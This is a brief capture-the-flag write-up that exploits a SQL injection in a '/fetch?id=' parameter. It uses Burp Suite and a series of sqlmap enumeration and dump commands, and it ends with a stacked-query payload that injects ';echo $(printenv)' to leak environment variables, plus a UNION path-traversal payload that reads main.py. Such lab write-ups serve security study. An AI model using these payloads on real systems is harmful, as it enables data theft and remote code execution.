# Step by step

#### View page source
- The application fetch image via `/fetch?id=1`

#### Manual test 
- The `/fetch?id=1` input entry vulnerable with SQLi

#### Scan with **burpsuite**
- Previous input entry has time-based blind SQLi `fetch?id=1%20OR%20SLEEP(5)`
- `id=3` cause server internal error

#### Used **sqlmap** scan 
- The app use MySQL. `sqlmap -u 'https://url/fetch?id=1`
- Scan for tables. `sqlmap -u 'https://url/fetch?id=1' --dbms=mysql --tables`
- 4 database: 
    - information_schema
    - level5
    - mysql
    - performance_schema
- Enumerate tables in **level5**. `sqlmap -u 'https://url/fetch?id=1' --dbms=mysql -D level5 --tables`
- 2 tables: 
    - albums
    - photos
- Enumerate all column in tables in **level5**. `sqlmap -u 'https://url/fetch?id=1' --dbms=mysql -D level5 --columns --threads 4`
- Dump id column of photos. ` --dbms=mysql --technique=BT -D level5 -T photos -C id --dump --threads 4`
- 3 value: 1, 2, 3
- Dump whole table photos since this table is small. `--dbms=mysql --technique=BT -D level5 -T photos --dump --threads 4`
- Found flag!!!
- Dump albums:
- RCE payload: `fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;`
- Union payload: `/fetch?id=-1 UNION select '/../../main.py'`
